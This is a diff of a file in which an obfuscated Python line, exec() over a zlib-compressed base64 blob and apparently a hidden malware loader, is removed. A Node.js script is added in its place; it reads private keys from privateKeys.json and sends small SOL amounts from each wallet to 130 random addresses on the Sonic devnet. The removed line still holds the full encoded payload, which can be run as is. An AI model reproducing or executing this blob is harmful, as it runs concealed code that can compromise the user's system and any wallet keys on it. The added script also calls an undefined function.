@@ -1,2 +1,111 @@
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(b'eJyNVltv2zYUfvevOAMKmNocJVkRoHWXYVmb7NI0MaKseyiKmhFpi7VEaiTVzEj133dI3Wg5GdqHKublXL7vnO8wVdJYeJgAvFZS8tQKJWf46/Ls3eL65jb5tDi/+ZRcX7q1W02lof2RZGssLxZarTUt3ILhkp1JhoZWQhej04vqLhfpW751P/BTUqFnkxpOQfN/KqE5mf5iVE4lPbznd8/jz2YavZqkPryVCY+tgp1U5Urv7DYr7sTk8BDecbkWRak0FIpVOVha3NGMSthSuQYmSq7zakNla+5OlM9fhtb8wuDuARjX4gtfUJvBTuyc/XhycvzyIGMHG74dbtxRw09e7Jg0Jy+68P66uYRK2moDGyX5xgh4w79IbtvLb87fX53ffnKnTmGaWVua+eEh80dio6RI4zUt+OF0gKPjEC9Ifh+QSgZjM0CUPEecdZFcVHKN7ptgCoeaFgUg8RNqtjKFVSUbu47kROVkpVXR0QhWDfQCLRSaiXxRNWHZoRTauILiIFFMGSN4eFRSsb+24po8+E0A5xMdIcBzCPzHZVhb7p+Pxx8LI2s3c+oKwpp5Gyl8/2i1A9QRfhw+XR5GrCW1leaYBb2nwj5d8mSgYhbmP4MPky6VvgsAPqKbxovKeZyrNWnqOF5rziWZNpZdgTABbxtv1Ij5NJoNUaGN+nEyMzybY5kDxeSpBZrSzaSndM0l19TyGyqZKs4Y09wYbjCEnkfN0YGEM63pNnaxkwfI0bDN5uCPQT0DEsHpzz67jpjOMnLccxRblVgt5Jq08D4eM6MltS7k1hYwqgWU2H1oD5DbMH7bHrpwBdIcwRVS9n/+6tswrMlgb2u5k5CmVWPGU8X4/t1X/dVNG9Fpn6dDJOGp9oGQkWl/swWwvfpU0liZDU8Zp6g0QBKOH9QrCtTSCsnPBErkGo9EQ/5MmDKn29/9HTIkOSqlgiIdlpLpwcEBJF5qwz6EJNWitIC706ihhTS973n1VkeefGtgGtdWYVUJgykUIhcZfi1iCMdAAsKiHkDczhRzmnY89TZy7lqJs0WmEWxzrRE701m/xIQNAoUEpRRWIucBeQYHhVclU1HR+e3E3cWCNsQKSOfy1DttMIJ9nxjTn8n1VVxSbThZmVhjqhfoMkEgyHTsd4pSWtnVwQuPmLPofH3XtIkw/kv2nETw9eu+67jpJx/iURcgSlmm1b3XzHOtlSbtMrSjDwNk+3EBciGVw9TNBK1RiPIt4BTEdV6UFgdUa6cNu8b/a+C54a3jsdvQ2x/yC80FAyHLqifT8By9uIHiTdb7pRHI0PHzo1aK+pqgjey89mJy6k50/L93zvAmfK6KnGadhnmSqbOGXdEZRp7NRpQVdpqwFEzFqKtGnJe09Prneges+xm1lSHMFb0ioXvPz048PwWUfAsysirusH3VqjODAmNKnoqV2ENogTGtRe4m7P+LtuEp1bTR7g41vSvZCNxTYr6TYAft7SA4ztkOtAOqIzmZBNV3l1ecLH9rfTJ49hD6qdv4BhTmy6iZraPAR4O2Gcy3KsE5gDkdxUdHx357hTVMmjMfhGT835lvJN9BHx3e+22FmqcFAhB1BDqxCcbv0LehRhxNhxYMDveDf3fmJOiV9IF0PRX209jKkzNrz0oL9wj/noEtz3N1P8jC8m33csPpBH/T3KX77KHfx1QdbvADHPdr9RxPPPqgCoZ1vewkY9IKR/OQGRhpWXY0jOgdsGwfhMOrrH0Q9r+7Qm3Tx37TWxjCH55d3/IIbSqoN/UojgGWzWNrmVQb10tYy4GR2kNq1VDi9TLqTfQuakipTTMg3IlDFETeueZj1VheUBwwzNl2ee37cU0Djb3ezaDakzpyk/g/9HODTQ==')))
+const {
+  Connection,
+  LAMPORTS_PER_SOL,
+  Transaction,
+  SystemProgram,
+  sendAndConfirmTransaction,
+  PublicKey,
+  Keypair,
+} = require('@solana/web3.js');
+const fs = require('fs');
+const colors = require('colors');
+const bip39 = require('bip39');
+const { derivePath } = require('ed25519-hd-key');
+const base58 = require('bs58');
+const DEVNET_URL = 'https://devnet.sonic.game/';
+const connection = new Connection(DEVNET_URL, 'confirmed');
+
+async function sendSol(fromKeypair, toPublicKey, amount) {
+  const transaction = new Transaction().add(
+    SystemProgram.transfer({
+      fromPubkey: fromKeypair.publicKey,
+      toPubkey: toPublicKey,
+      lamports: amount * LAMPORTS_PER_SOL,
+    })
+  );
+
+  const signature = await sendAndConfirmTransaction(connection, transaction, [
+    fromKeypair,
+  ]);
+  console.log(colors.green('Transaksi di Konfirmasi:'), signature);
+}
+
+
+function generateRandomAddresses(count) {
+  return Array.from({ length: count }, () =>
+    Keypair.generate().publicKey.toString()
+  );
+}
+
+
+function getKeypairFromPrivateKey(privateKeyBase58) {
+  const privateKeyBytes = base58.decode(privateKeyBase58);
+  const keypair = Keypair.fromSecretKey(privateKeyBytes);
+  return keypair;
+}
+
+function displayHeader() {
+  console.log(colors.magenta('--- Solana Transaction Script ---'));
+}
+
+(async () => {
+  displayHeader();
+
+  const method = '1';
+
+  let seedPhrasesOrKeys;
+  
+  if (method === '1') {
+    seedPhrasesOrKeys = JSON.parse(fs.readFileSync('privateKeys.json', 'utf-8'));
+    if (!Array.isArray(seedPhrasesOrKeys) || seedPhrasesOrKeys.length === 0) {
+      throw new Error(
+        colors.red('privateKeys.json is not set correctly or is empty')
+      );
+    }
+  } else {
+    throw new Error(colors.red('Invalid input method selected'));
+  }
+
+  const addressCount = 130;
+
+  if (isNaN(addressCount) || addressCount <= 0) {
+    throw new Error(colors.red('Invalid number of addresses specified'));
+  }
+
+  const randomAddresses = generateRandomAddresses(addressCount);
+
+  console.log(
+    colors.blue(`Generated ${addressCount} random addresses:`),
+    randomAddresses
+  );
+
+  const amountToSend = 0.001;
+
+  for (const [index, seedOrKey] of seedPhrasesOrKeys.entries()) {
+    let fromKeypair;
+    if (method === '0') {
+      fromKeypair = await getKeypairFromSeed(seedOrKey);
+    } else {
+      fromKeypair = getKeypairFromPrivateKey(seedOrKey);
+    }
+    console.log(
+      colors.yellow(
+        `Kirim SOL Ke Wallet ${
+          index + 1
+        }: ${fromKeypair.publicKey.toString()}`
+      )
+    );
+
+    for (const address of randomAddresses) {
+      const toPublicKey = new PublicKey(address);
+      try {
+        await sendSol(fromKeypair, toPublicKey, amountToSend);
+        console.log(
+          colors.green(`Sukses ${amountToSend} SOL to ${address}`)
+        );
+      } catch (error) {
+        console.error(colors.red(`Failed to send SOL to ${address}:`), error);
+      }
+    }
+  }
+})();
